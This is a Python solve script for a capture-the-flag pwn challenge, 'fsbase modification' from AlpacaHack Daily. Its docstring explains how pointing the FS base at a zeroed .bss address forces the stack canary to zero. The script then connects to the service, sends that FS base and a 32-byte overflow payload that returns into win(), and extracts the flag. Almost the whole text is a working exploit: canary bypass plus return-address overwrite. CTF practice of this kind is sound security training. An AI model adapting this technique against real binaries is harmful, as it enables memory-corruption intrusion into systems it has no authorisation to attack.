#!/usr/bin/env python3
"""
fsbase modification - AlpacaHack Daily (pwn, Hard)

vuln() has a stack buffer overflow (reads 32 into char buf[8]) protected by a
stack canary loaded from fs:0x28. But main() lets us set the FS base to an
arbitrary value via arch_prctl(ARCH_SET_FS, fsbase) before vuln() runs.

The binary is no-PIE, so .bss is at a fixed address 0x404038 holding 8 zero
bytes. If we set fsbase = 0x404038 - 0x28 = 0x404010, then the canary is read
from fs:0x28 = *0x404038 = 0. We then overflow with a 0 canary and jump to
win(), which execve("/bin/cat","/flag.txt").

Stack in vuln: [buf 8][canary 8][saved rbp 8][retaddr 8] = 32 bytes.

Usage: python3 -I solve.py HOST PORT
"""
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1337

WIN = 0x4011B6
BSS = 0x404038          # 8 zero bytes
FSBASE = BSS - 0x28     # 0x404010 -> fs:0x28 reads *BSS == 0


def p64(x):
    return struct.pack("<Q", x)


def main():
    s = socket.create_connection((HOST, PORT), timeout=20)
    s.settimeout(6)

    def until(marker):
        buf = b""
        while marker not in buf:
            d = s.recv(4096)
            if not d:
                break
            buf += d
        return buf

    until(b"fsbase")
    s.sendall(str(FSBASE).encode() + b"\n")   # set FS base so canary == 0

    until(b"message>")
    payload = b"A" * 8 + p64(0) + p64(BSS) + p64(WIN)   # canary=0, rbp, ret=win
    assert len(payload) == 32
    s.sendall(payload)

    data = b""
    while True:
        try:
            chunk = s.recv(4096)
        except socket.timeout:
            break
        if not chunk:
            break
        data += chunk
    text = data.decode(errors="replace")
    import re
    m = re.search(r"Alpaca\{[^}]*\}", text)
    print(m.group(0) if m else "[no flag]\n" + text)


if __name__ == "__main__":
    main()
